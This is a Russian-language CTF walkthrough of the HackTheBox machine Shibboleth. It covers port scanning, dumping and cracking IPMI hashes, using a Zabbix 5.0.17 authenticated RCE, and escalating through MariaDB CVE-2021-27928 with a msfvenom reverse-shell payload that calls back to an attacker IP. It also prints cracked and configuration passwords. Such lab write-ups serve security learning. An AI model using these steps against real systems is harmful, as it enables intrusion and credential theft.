# Shibboleth (2022)

## Прохождение Hackthebox::Shibboleth

<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

## Сканируем порты с помощью nmap

```
$ nmap -sC -sV -oN nmap 10.10.11.124
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb
```

На 80-ом порту нет ничего интересного, обычный `bootstrap` сайт:

<figure><img src="../../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

Сканим виртуальные хосты:

```
$ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u shibboleth.htb -t 20 | grep -v 302
```

```
Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]    
Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]      
Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]
```

Все поддомены ведут на страницу авторизации `Zabbix`:

<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

Но у нас нет данных, также я нагуглил, что для определенной версии `Zabbix` есть `Authenticated RCE`.

```
$ sudo nmap -sU 10.10.11.124
```

```
PORT      STATE         SERVICE
623/udp   open          asf-rmcp
16697/udp open|filtered unknown
19181/udp open|filtered unknown
```

На 623 порту у нас расположен IPMI, значит можно попробовать сдампить юзеров и хэши их паролей:

```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_JOHN_FILE out.john
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > exploit
```

```
$ sudo john out.john --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepumkinpie1  (10.10.11.124 Administrator)
1g 0:00:00:01 DONE (2022-03-17 12:22) 0.7299g/s 5453Kp/s 5453Kc/s 5453KC/s jenalyn86..iargxe
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Теперь мы можем авторизоваться на Zabbix:

<figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

Zabbix версии 5.0.17, я нашел эксплоит для RCE с использованием логина и пароля - [https://packetstormsecurity.com/files/166256/Zabbix-5.0.17-Remote-Code-Execution.html](https://packetstormsecurity.com/files/166256/Zabbix-5.0.17-Remote-Code-Execution.html):

<figure><img src="../../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Теперь переходим по ссылке, которую выдал нам эксплоит:

<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

Жмем кнопку '`Test`', а потом '`Get value and test`':

<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

Получаем реверс и стабилизируем его:

<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Изначально вход происходит от имени юзера - `zabbix`, но можно попробовать войти под `ipmi-svc`, используя старый пароль от панели `Zabbix` - `ilovepumkinpie1`:

<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

В файле /etc/zabbix/zabbix\_server.conf можно увидеть некоторые данные для mysql:

```
DBUser=zabbix                                                                                               DBPassword=bloooarskybluh
```

```
$ mysql --version
```

```
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
```

Нам нужен [данный сплоит](https://github.com/Al1ex/CVE-2021-27928). Затем делаем реверс шелл с помощью msfvenom, ставим листенер, загружаем на атакуемую машину, заходим в mysql и делаем те же операции, что и на скрине:

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.28 LPORT=9999 -f elf-so -o CVE-2021-27928.so
$ python3 -m http.server
```

<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

```
MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so"
```
